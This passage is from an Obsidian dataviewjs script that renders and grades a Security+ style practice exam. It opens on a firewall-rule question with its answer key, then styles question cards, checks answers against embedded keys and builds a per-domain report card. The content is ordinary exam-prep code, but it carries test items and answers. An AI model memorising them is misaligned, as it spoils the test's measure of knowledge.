defense-in-depth deny."},{"id":"5c","goal":"Allow the SMTP Relay in the DMZ to query the Internal DNS server so it can resolve internal hostnames during message routing.","answer":{"srcIP":"10.20.30.25","dstIP":"172.16.50.53","proto":"UDP","port":"53","action":"Allow"},"w":"DNS queries are UDP/53 by default (TCP/53 for zone transfers and large responses). Source is the SMTP relay; destination is internal DNS."}],"objective":"4.5","url":"https://professormesser.link/701040501"}
];

const domainNames = {"1": "1.0 General Security Concepts", "2": "2.0 Threats, Vulnerabilities, and Mitigations", "3": "3.0 Security Architecture", "4": "4.0 Security Operations", "5": "5.0 Security Program Management & Oversight"};

// ---- State ----
const selections = {}; // qNum -> Set of letters
questions.forEach(q => { selections[q.n] = new Set(); });
const pbqSelections = {};
pbqs.forEach(p => { pbqSelections[p.n] = {}; });
let graded = false;

// ---- Render setup ----
const root = dv.container;
root.empty();

const style = root.createEl("style");
style.textContent = `
  .pe-intro { padding: 12px 16px; background: var(--background-secondary); border-radius: 6px; margin-bottom: 18px; font-size: 0.9em; color: var(--text-muted); }
  .pe-progress { position: sticky; top: 0; z-index: 10; padding: 10px 14px; background: var(--background-secondary); border-radius: 6px; font-size: 0.9em; color: var(--text-muted); margin-bottom: 20px; border: 1px solid var(--background-modifier-border); }
  .pe-card { border: 1px solid var(--background-modifier-border); padding: 18px 22px; margin-bottom: 22px; border-radius: 8px; background: var(--background-primary-alt); scroll-margin-top: 60px; }
  .pe-q-header { display: flex; align-items: baseline; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
  .pe-q-num { font-weight: 700; color: var(--text-muted); font-size: 0.85em; letter-spacing: 0.05em; }
  .pe-q-tag { font-size: 0.75em; padding: 2px 8px; border-radius: 10px; background: var(--background-secondary); color: var(--text-muted); border: 1px solid var(--background-modifier-border); }
  .pe-q-tag.multi { background: rgba(187, 128, 9, 0.12); color: var(--text-normal); border-color: rgba(187, 128, 9, 0.4); }
  .pe-q-text { font-weight: 500; line-height: 1.55; font-size: 1.0em; white-space: pre-wrap; word-wrap: break-word; }
  .pe-opt { display: flex; align-items: center; gap: 10px; width: 100%; text-align: left; padding: 10px 14px; margin: 7px 0; border: 1px solid var(--background-modifier-border); background: var(--background-secondary); cursor: pointer; border-radius: 6px; color: var(--text-normal); font-size: 0.95em; line-height: 1.45; transition: all 120ms ease; font-family: inherit; }
  .pe-opt:hover:not(:disabled) { background: var(--background-modifier-hover); }
  .pe-opt.selected { background: rgba(56, 139, 253, 0.14); border-color: rgba(56, 139, 253, 0.55); }
  .pe-opt-letter { font-weight: 600; color: var(--text-muted); flex-shrink: 0; min-width: 18px; }
  .pe-opt-text { flex: 1; }
  .pe-opt.graded-correct-selected { background: rgba(63, 185, 80, 0.18); border-color: rgba(63, 185, 80, 0.55); }
  .pe-opt.graded-correct-missed { background: rgba(63, 185, 80, 0.08); border-color: rgba(63, 185, 80, 0.45); border-style: dashed; }
  .pe-opt.graded-wrong-selected { background: rgba(248, 81, 73, 0.14); border-color: rgba(248, 81, 73, 0.5); }
  .pe-opt.graded-neutral { opacity: 0.65; }
  .pe-grade-btn { display: block; margin: 30px auto 10px; padding: 13px 36px; font-size: 1.05em; font-weight: 600; background: var(--interactive-accent); color: var(--text-on-accent); border: none; border-radius: 8px; cursor: pointer; transition: all 120ms ease; }
  .pe-grade-btn:hover:not(:disabled) { filter: brightness(1.1); }
  .pe-grade-btn:disabled { opacity: 0.6; cursor: not-allowed; }
  .pe-feedback { margin-top: 14px; padding: 12px 16px; border-radius: 6px; font-size: 0.9em; line-height: 1.55; display: none; }
  .pe-feedback.correct { background: rgba(63, 185, 80, 0.08); border-left: 3px solid rgba(63, 185, 80, 0.6); }
  .pe-feedback.incorrect { background: rgba(248, 81, 73, 0.08); border-left: 3px solid rgba(248, 81, 73, 0.55); }
  .pe-feedback .pe-fb-row { margin: 6px 0; }
  .pe-feedback .pe-fb-letter { display: inline-block; font-weight: 600; margin-right: 6px; }
  .pe-feedback .pe-fb-link { margin-top: 8px; font-size: 0.85em; color: var(--text-muted); }
  .pe-feedback .pe-fb-link a { color: var(--text-accent); text-decoration: none; }
  .pe-report { padding: 22px 26px; margin: 0 0 28px; border-radius: 10px; background: var(--background-primary-alt); border: 2px solid var(--background-modifier-border); }
  .pe-report h2 { margin-top: 0; }
  .pe-score-line { font-size: 1.3em; font-weight: 600; margin: 10px 0; }
  .pe-score-percent { font-size: 1.6em; }
  .pe-score-percent.pass { color: rgb(63, 185, 80); }
  .pe-score-percent.fail { color: rgb(248, 81, 73); }
  .pe-pass-note { font-size: 0.9em; color: var(--text-muted); margin: 6px 0 18px; }
  .pe-domain-table { width: 100%; border-collapse: collapse; margin: 10px 0; font-size: 0.9em; }
  .pe-domain-table th, .pe-domain-table td { padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--background-modifier-border); }
  .pe-domain-table th { font-weight: 600; color: var(--text-muted); }
  .pe-domain-table .pe-dt-score { text-align: right; font-variant-numeric: tabular-nums; }
  .pe-miss-list { margin: 14px 0 4px; padding-left: 20px; }
  .pe-miss-list li { margin: 6px 0; font-size: 0.9em; }
  .pe-miss-list a { color: var(--text-accent); text-decoration: none; }
  .pe-miss-list a:hover { text-decoration: underline; }
  .pbq-section-header { margin-top: 8px; margin-bottom: 14px; font-size: 1.05em; color: var(--text-muted); font-weight: 600; letter-spacing: 0.02em; border-bottom: 1px solid var(--background-modifier-border); padding-bottom: 8px; }
  .pbq-prompt { font-style: italic; color: var(--text-muted); margin: 8px 0 14px; font-size: 0.92em; line-height: 1.5; }
  .pbq-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
  .pbq-table td { padding: 9px 10px; vertical-align: middle; border-bottom: 1px solid var(--background-modifier-border); font-size: 0.95em; }
  .pbq-table td.pbq-desc-cell { padding-right: 18px; line-height: 1.45; }
  .pbq-table td.pbq-sel-cell { width: 230px; text-align: right; }
  .pbq-select { padding: 6px 10px; border-radius: 4px; border: 1px solid var(--background-modifier-border); background: var(--background-secondary); color: var(--text-normal); font-size: 0.9em; min-width: 210px; font-family: inherit; }
  .pbq-select:focus { outline: 2px solid var(--interactive-accent); outline-offset: 1px; }
  .pbq-select:disabled { opacity: 0.85; cursor: default; }
  .pbq-row-correct { background: rgba(63, 185, 80, 0.08); }
  .pbq-row-wrong { background: rgba(248, 81, 73, 0.06); }
  .pbq-srv-list { font-size: 0.85em; color: var(--text-muted); margin: 10px 0; padding: 9px 12px; background: var(--background-secondary); border-radius: 4px; line-height: 1.7; }
  .pbq-rule { margin: 14px 0; padding: 12px 14px; background: var(--background-secondary); border-radius: 6px; border: 1px solid var(--background-modifier-border); }
  .pbq-rule-goal { font-weight: 500; margin-bottom: 10px; font-size: 0.92em; line-height: 1.5; }
  .pbq-fw-table { width: 100%; border-collapse: collapse; font-size: 0.85em; }
  .pbq-fw-table th { text-align: left; padding: 4px 6px; color: var(--text-muted); font-weight: 600; font-size: 0.78em; text-transform: uppercase; letter-spacing: 0.03em; }
  .pbq-fw-table td { padding: 4px 6px; }
  .pbq-fw-select { min-width: 95px; font-size: 0.85em; padding: 4px 8px; }
  .pbq-report-tbl { width: 100%; border-collapse: collapse; margin: 10px 0 14px; font-size: 0.9em; }
  .pbq-report-tbl th, .pbq-report-tbl td { padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--background-modifier-border); }
  .pbq-report-tbl th { font-weight: 600; color: var(--text-muted); }
  .pbq-report-tbl .pbq-rt-score { text-align: right; font-variant-numeric: tabular-nums; }
  .pbq-report-tbl a { color: var(--text-accent); text-decoration: none; }
  .pbq-report-tbl a:hover { text-decoration: underline; }
`;

const intro = root.createDiv({ cls: "pe-intro" });
intro.setText(`5 performance-based questions + ${questions.length} multiple-choice questions. Multi-select MCQs are flagged below. No feedback until you click Grade my test at the bottom.`);

const progress = root.createDiv({ cls: "pe-progress" });
const countPbqItems = (p) => {
  if (p.type === "match") return p.items.length;
  if (p.type === "firewall") return p.rules.reduce((s, r) => s + Object.keys(r.answer).length, 0);
  return 0;
};
const countPbqAnswered = (p) => {
  if (p.type === "match") return Object.values(pbqSelections[p.n]).filter(v => v).length;
  if (p.type === "firewall") {
    let n = 0;
    p.rules.forEach(r => {
      const sel = pbqSelections[p.n][r.id] || {};
      Object.keys(r.answer).forEach(k => { if (sel[k]) n++; });
    });
    return n;
  }
  return 0;
};
const pbqItemsTotal = pbqs.reduce((s, p) => s + countPbqItems(p), 0);
const updateProgress = () => {
  if (graded) return;
  const mcqAnswered = questions.filter(q => selections[q.n].size > 0).length;
  const pbqAnswered = pbqs.reduce((s, p) => s + countPbqAnswered(p), 0);
  progress.setText(`PBQ ${pbqAnswered}/${pbqItemsTotal}  ·  MCQ ${mcqAnswered}/${questions.length}`);
};
updateProgress();

const reportContainer = root.createDiv();

const pbqHeader = root.createDiv({ cls: "pbq-section-header" });
pbqHeader.setText("Performance-Based Questions · B1–B5");

const pbqContainer = root.createDiv();

pbqs.forEach(p => {
  const card = pbqContainer.createDiv({ cls: "pe-card" });
  card.id = `pe-pbq-${p.n}`;

  const hdr = card.createDiv({ cls: "pe-q-header" });
  hdr.createEl("span", { cls: "pe-q-num", text: `PBQ · B${p.n}` });
  if (p.objective) {
    const objTag = hdr.createEl("span", { cls: "pe-q-tag" });
    objTag.setText(`Obj ${p.objective}`);
  }

  card.createEl("div", { cls: "pe-q-text", text: p.title });
  const promptEl = card.createDiv({ cls: "pbq-prompt" });
  promptEl.setText(p.prompt);

  if (p.type === "match") {
    const tbl = card.createEl("table", { cls: "pbq-table" });
    p.items.forEach(item => {
      const tr = tbl.createEl("tr");
      tr.dataset.itemId = item.id;
      tr.createEl("td", { cls: "pbq-desc-cell", text: item.desc });
      const tdSel = tr.createEl("td", { cls: "pbq-sel-cell" });
      const sel = tdSel.createEl("select", { cls: "pbq-select" });
      const def = sel.createEl("option", { text: "— Select —" });
      def.value = "";
      p.options.forEach(opt => {
        const o = sel.createEl("option", { text: opt });
        o.value = opt;
      });
      sel.onchange = () => {
        if (graded) return;
        pbqSelections[p.n][item.id] = sel.value;
        updateProgress();
      };
    });
  } else if (p.type === "firewall") {
    const srvList = card.createDiv({ cls: "pbq-srv-list" });
    srvList.createEl("strong", { text: "Servers: " });
    p.servers.forEach((s, i) => {
      srvList.appendText(`${s.name} ${s.ip}`);
      if (i < p.servers.length - 1) srvList.appendText("  ·  ");
    });

    p.rules.forEach((rule, idx) => {
      const ruleBox = card.createDiv({ cls: "pbq-rule" });
      ruleBox.dataset.ruleId = rule.id;
      ruleBox.createEl("div", { cls: "pbq-rule-goal", text: `Rule ${idx + 1}: ${rule.goal}` });

      const tbl = ruleBox.createEl("table", { cls: "pbq-fw-table" });
      const thead = tbl.createEl("thead");
      const trh = thead.createEl("tr");
      ["Source IP", "Destination IP", "Protocol", "Port", "Action"].forEach(h => {
        trh.createEl("th", { text: h });
      });
      const tbody = tbl.createEl("tbody");
      const tr = tbody.createEl("tr");

      const ipOptions = p.servers.map(s => s.ip);
      const fields = [
        { key: "srcIP", options: ipOptions },
        { key: "dstIP", options: ipOptions },
        { key: "proto", options: ["TCP", "UDP"] },
        { key: "port", options: p.ports },
        { key: "action", options: ["Allow", "Block"] }
      ];

      fields.forEach(f => {
        const td = tr.createEl("td");
        const sel = td.createEl("select", { cls: "pbq-select pbq-fw-select" });
        const def = sel.createEl("option", { text: "—" });
        def.value = "";
        f.options.forEach(opt => {
          const o = sel.createEl("option", { text: opt });
          o.value = opt;
        });
        sel.dataset.field = f.key;
        sel.onchange = () => {
          if (graded) return;
          if (!pbqSelections[p.n][rule.id]) pbqSelections[p.n][rule.id] = {};
          pbqSelections[p.n][rule.id][f.key] = sel.value;
          updateProgress();
        };
      });
    });
  }

  const fb = card.createDiv({ cls: "pe-feedback" });
  fb.dataset.pbqN = p.n;
});

const mcqHeader = root.createDiv({ cls: "pbq-section-header" });
mcqHeader.setText("Multiple-Choice Questions · B6–B90");
mcqHeader.style.marginTop = "30px";


const cardsContainer = root.createDiv();

questions.forEach((q) => {
  const correctCount = q.opts.filter(o => o.c).length;
  const isMulti = correctCount > 1;

  const card = cardsContainer.createDiv({ cls: "pe-card" });
  card.id = `pe-q-${q.n}`;

  const header = card.createDiv({ cls: "pe-q-header" });
  header.createEl("span", { cls: "pe-q-num", text: `Q${q.n - 5}  ·  B${q.n}` });
  if (isMulti) {
    const tag = header.createEl("span", { cls: "pe-q-tag multi" });
    tag.setText(`Select ${correctCount}`);
  }
  if (q.objective) {
    const objTag = header.createEl("span", { cls: "pe-q-tag" });
    objTag.setText(`Obj ${q.objective}`);
  }

  card.createEl("div", { cls: "pe-q-text", text: q.q });

  const optButtons = {};
  q.opts.forEach(opt => {
    const btn = card.createEl("button", { cls: "pe-opt" });
    const letterSpan = btn.createEl("span", { cls: "pe-opt-letter", text: `${opt.l}.` });
    const textSpan = btn.createEl("span", { cls: "pe-opt-text", text: opt.t });
    optButtons[opt.l] = btn;
    btn.onclick = () => {
      if (graded) return;
      const sel = selections[q.n];
      if (isMulti) {
        if (sel.has(opt.l)) {
          sel.delete(opt.l);
          btn.classList.remove("selected");
        } else {
          sel.add(opt.l);
          btn.classList.add("selected");
        }
      } else {
        sel.clear();
        Object.values(optButtons).forEach(b => b.classList.remove("selected"));
        sel.add(opt.l);
        btn.classList.add("selected");
      }
      updateProgress();
    };
  });

  const feedback = card.createDiv({ cls: "pe-feedback" });
  feedback.dataset.qnum = q.n;
});

const gradeBtn = root.createEl("button", { cls: "pe-grade-btn", text: "Grade my test" });

gradeBtn.onclick = () => {
  if (graded) return;
  graded = true;
  gradeBtn.disabled = true;
  gradeBtn.setText("Test graded — scroll up for your report card");
  progress.style.display = "none";

  // ---- Grade PBQs ----
  let pbqItemsCorrect = 0;
  const pbqResults = {};

  pbqs.forEach(p => {
    pbqResults[p.n] = { correct: 0, total: 0, details: [] };
    const card = document.getElementById(`pe-pbq-${p.n}`);
    card.querySelectorAll("select.pbq-select").forEach(s => { s.disabled = true; });

    if (p.type === "match") {
      p.items.forEach(item => {
        const got = pbqSelections[p.n][item.id] || "";
        const right = (got === item.answer);
        pbqResults[p.n].total += 1;
        if (right) { pbqResults[p.n].correct += 1; pbqItemsCorrect += 1; }
        pbqResults[p.n].details.push({ kind: "match", desc: item.desc, got, expected: item.answer, right, w: item.w });
        const tr = card.querySelector(`tr[data-item-id="${item.id}"]`);
        if (tr) tr.classList.add(right ? "pbq-row-correct" : "pbq-row-wrong");
      });
    } else if (p.type === "firewall") {
      p.rules.forEach(rule => {
        const sel = pbqSelections[p.n][rule.id] || {};
        const fieldRights = {};
        let ruleAllRight = true;
        Object.keys(rule.answer).forEach(k => {
          const got = sel[k] || "";
          const right = (got === rule.answer[k]);
          fieldRights[k] = { got, expected: rule.answer[k], right };
          pbqResults[p.n].total += 1;
          if (right) { pbqResults[p.n].correct += 1; pbqItemsCorrect += 1; }
          else ruleAllRight = false;
        });
        pbqResults[p.n].details.push({ kind: "firewall", goal: rule.goal, fields: fieldRights, w: rule.w, allRight: ruleAllRight });
        const rb = card.querySelector(`div[data-rule-id="${rule.id}"]`);
        if (rb) rb.classList.add(ruleAllRight ? "pbq-row-correct" : "pbq-row-wrong");
      });
    }

    const fb = card.querySelector(".pe-feedback");
    const allRight = pbqResults[p.n].correct === pbqResults[p.n].total;
    fb.classList.add(allRight ? "correct" : "incorrect");
    fb.style.display = "";
    const headerRow = fb.createDiv({ cls: "pe-fb-row" });
    headerRow.innerHTML = `<strong>${allRight ? "✓" : "✗"} ${pbqResults[p.n].correct} / ${pbqResults[p.n].total} item${pbqResults[p.n].total === 1 ? "" : "s"} correct</strong>`;

    pbqResults[p.n].details.forEach((d, idx) => {
      if (d.kind === "match") {
        const row = fb.createDiv({ cls: "pe-fb-row" });
        const mark = d.right ? "✓" : "✗";
        const yourPart = d.got ? `picked <em>${escapeHtml(d.got)}</em>` : `<em>no answer</em>`;
        row.innerHTML = `<strong>${mark}</strong> ${escapeHtml(d.desc)} → <strong>${escapeHtml(d.expected)}</strong>${d.right ? "" : ` &nbsp;(${yourPart})`}`;
        if (!d.right && d.w) {
          const why = fb.createDiv();
          why.style.marginLeft = "22px";
          why.style.fontSize = "0.88em";
          why.style.color = "var(--text-muted)";
          why.style.marginTop = "2px";
          why.setText(d.w);
        }
      } else if (d.kind === "firewall") {
        const row = fb.createDiv({ cls: "pe-fb-row" });
        row.style.marginTop = "10px";
        const mark = d.allRight ? "✓" : "✗";
        row.innerHTML = `<strong>${mark} Rule ${idx + 1}:</strong> ${escapeHtml(d.goal)}`;
        Object.keys(d.fields).forEach(k => {
          const f = d.fields[k];
          if (!f.right) {
            const sub = fb.createDiv();
            sub.style.marginLeft = "22px";
            sub.style.fontSize = "0.88em";
            const labelMap = { srcIP: "Source IP", dstIP: "Destination IP", proto: "Protocol", port: "Port", action: "Action" };
            sub.innerHTML = `<strong>${labelMap[k]}:</strong> ${escapeHtml(f.expected)} <span style="color:var(--text-muted)">(you picked ${escapeHtml(f.got || "—")})</span>`;
          }
        });
        if (!d.allRight && d.w) {
          const why = fb.createDiv();
          why.style.marginLeft = "22px";
          why.style.fontSize = "0.88em";
          why.style.color = "var(--text-muted)";
          why.style.marginTop = "4px";
          why.setText(d.w);
        }
      }
    });

    if (p.url) {
      const linkRow = fb.createDiv({ cls: "pe-fb-link" });
      linkRow.innerHTML = `Reference: <a href="${p.url}" target="_blank" rel="noopener">Objective ${escapeHtml(p.objective)}</a>`;
    }
  });

  let totalCorrect = 0;
  const missed = [];
  const domainStats = {};

  questions.forEach((q) => {
    const sel = selections[q.n];
    const correctLetters = new Set(q.opts.filter(o => o.c).map(o => o.l));
    const allRight = sel.size === correctLetters.size && [...sel].every(l => correctLetters.has(l));

    if (q.domain) {
      if (!domainStats[q.domain]) domainStats[q.domain] = { right: 0, total: 0 };
      domainStats[q.domain].total += 1;
      if (allRight) domainStats[q.domain].right += 1;
    }

    if (allRight) totalCorrect += 1;
    else missed.push(q);

    const card = document.getElementById(`pe-q-${q.n}`);
    const buttons = card.querySelectorAll(".pe-opt");
    buttons.forEach(btn => {
      const letter = btn.querySelector(".pe-opt-letter").innerText.replace(".", "");
      const isSel = sel.has(letter);
      const isCorrect = correctLetters.has(letter);
      btn.classList.remove("selected");
      btn.disabled = true;
      if (isCorrect && isSel) btn.classList.add("graded-correct-selected");
      else if (isCorrect && !isSel) btn.classList.add("graded-correct-missed");
      else if (!isCorrect && isSel) btn.classList.add("graded-wrong-selected");
      else btn.classList.add("graded-neutral");
    });

    const fb = card.querySelector(".pe-feedback");
    fb.classList.add(allRight ? "correct" : "incorrect");
    fb.style.display = "";

    const headerRow = fb.createDiv({ cls: "pe-fb-row" });
    headerRow.innerHTML = allRight
      ? "<strong>✓ Correct</strong>"
      : (sel.size === 0
          ? "<strong>✗ No answer</strong>"
          : "<strong>✗ Incorrect</strong>");

    const firstCorrect = q.opts.find(o => o.c);
    if (firstCorrect) {
      const row = fb.createDiv({ cls: "pe-fb-row" });
      const correctLettersStr = q.opts.filter(o => o.c).map(o => o.l).join(", ");
      const correctTexts = q.opts.filter(o => o.c).map(o => o.t).join("; ");
      const strong = row.createEl("strong");
      strong.setText(`Answer: ${correctLettersStr}. ${correctTexts}`);
      const why = row.createDiv();
      why.style.marginTop = "6px";
      why.setText(firstCorrect.w);
    }

    const wrongPicked = [...sel].filter(l => !correctLetters.has(l));
    if (wrongPicked.length > 0) {
      const row = fb.createDiv({ cls: "pe-fb-row" });
      row.style.marginTop = "10px";
      const strong = row.createEl("strong");
      strong.setText("Why your pick was wrong:");
      wrongPicked.forEach(l => {
        const opt = q.opts.find(o => o.l === l);
        const sub = row.createDiv();
        sub.style.marginTop = "4px";
        sub.innerHTML = `<span class="pe-fb-letter">${l}.</span> ${escapeHtml(opt.w)}`;
      });
    }

    if (q.url) {
      const linkRow = fb.createDiv({ cls: "pe-fb-link" });
      linkRow.innerHTML = `Reference: <a href="${q.url}" target="_blank" rel="noopener">${escapeHtml(q.topic)}</a>`;
    }
  });

  const total = questions.length;
  const pct = (totalCorrect / total) * 100;
  const strictPass = pct >= 83;

  reportContainer.empty();
  const report = reportContainer.createDiv({ cls: "pe-report" });
  report.createEl("h2", { text: "Report Card" });

  const scoreLine = report.createDiv({ cls: "pe-score-line" });
  scoreLine.innerHTML = `MCQ: ${totalCorrect} / ${total} correct&nbsp;&nbsp;<span class="pe-score-percent ${strictPass ? "pass" : "fail"}">${pct.toFixed(1)}%</span>`;

  const passNote = report.createDiv({ cls: "pe-pass-note" });
  passNote.setText(strictPass
    ? `Above the ~83% CompTIA scaled-pass benchmark. Solid.`
    : `Below the ~83% CompTIA scaled-pass benchmark (≈ 750/900). Review the misses below.`);

  // PBQ section in report
  report.createEl("h3", { text: "Performance-Based (B1–B5)" });
  const pbqRptTbl = report.createEl("table", { cls: "pbq-report-tbl" });
  const pbqThead = pbqRptTbl.createEl("thead");
  const pbqTrh = pbqThead.createEl("tr");
  pbqTrh.createEl("th", { text: "PBQ" });
  pbqTrh.createEl("th", { text: "Topic" });
  pbqTrh.createEl("th", { text: "Score", cls: "pbq-rt-score" });
  pbqTrh.createEl("th", { text: "%", cls: "pbq-rt-score" });
  const pbqTbody = pbqRptTbl.createEl("tbody");
  pbqs.forEach(p => {
    const r = pbqResults[p.n];
    const tr = pbqTbody.createEl("tr");
    const tdN = tr.createEl("td");
    const link = tdN.createEl("a", { href: `#pe-pbq-${p.n}`, text: `B${p.n}` });
    link.onclick = (e) => {
      e.preventDefault();
      document.getElementById(`pe-pbq-${p.n}`).scrollIntoView({ behavior: "smooth", block: "start" });
    };
    tr.createEl("td", { text: p.title });
    tr.createEl("td", { text: `${r.correct} / ${r.total}`, cls: "pbq-rt-score" });
    const pct2 = r.total > 0 ? (r.correct / r.total * 100).toFixed(0) : "—";
    tr.createEl("td", { text: `${pct2}%`, cls: "pbq-rt-score" });
  });
  const pbqTotalItems = pbqs.reduce((s, p) => s + pbqResults[p.n].total, 0);
  const pbqSummary = report.createDiv();
  pbqSummary.style.fontSize = "0.9em";
  pbqSummary.style.marginTop = "4px";
  pbqSummary.style.marginBottom = "18px";
  pbqSummary.innerHTML = `<strong>PBQ total:</strong> ${pbqItemsCorrect} / ${pbqTotalItems} items`;

  // Domain breakdown
  report.createEl("h3", { text: "By domain" });
  const table = report.createEl("table", { cls: "pe-domain-table" });
  const thead = table.createEl("thead");
  const trh = thead.createEl("tr");
  trh.createEl("th", { text: "Domain" });
  trh.createEl("th", { text: "Score", cls: "pe-dt-score" });
  trh.createEl("th", { text: "%", cls: "pe-dt-score" });
  const tbody = table.createEl("tbody");
  Object.keys(domainNames).sort().forEach(d => {
    const s = domainStats[d] || { right: 0, total: 0 };
    if (s.total === 0) return;
    const tr = tbody.createEl("tr");
    tr.createEl("td", { text: domainNames[d] });
    tr.createEl("td", { text: `${s.right} / ${s.total}`, cls: "pe-dt-score" });
    tr.createEl("td", { text: `${((s.right / s.total) * 100).toFixed(0)}%`, cls: "pe-dt-score" });
  });

  if (missed.length > 0) {
    report.createEl("h3", { text: `Missed questions (${missed.length})` });
    const ul = report.createEl("ul", { cls: "pe-miss-list" });
    missed.forEach(q => {
      const li = ul.createEl("li");
      const a = li.createEl("a", { href: `#pe-q-${q.n}` });
      a.setText(`Q${q.n - 5} (B${q.n})`);
      a.onclick = (e) => {
        e.preventDefault();
        document.getElementById(`pe-q-${q.n}`).scrollIntoView({ behavior: "smooth", block: "start" });
      };
      const objLabel = q.objective ? ` — Obj ${q.objective}` : "";
      li.appendText(`${objLabel} — ${truncate(q.q.split("\n")[0], 90)}`);
    });
  } else {
    report.createEl("p", { text: "No misses. Clean sweep." });
  }

  report.scrollIntoView({ behavior: "smooth", block: "start" });
};

function escapeHtml(s) {
  return (s || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function truncate(s, n) {
  return s.length > n ? s.slice(0, n - 1) + "…" : s;
}
```


---

## Misses log

*(none yet — fill in after the first session: date, score, themes from missed Qs)*
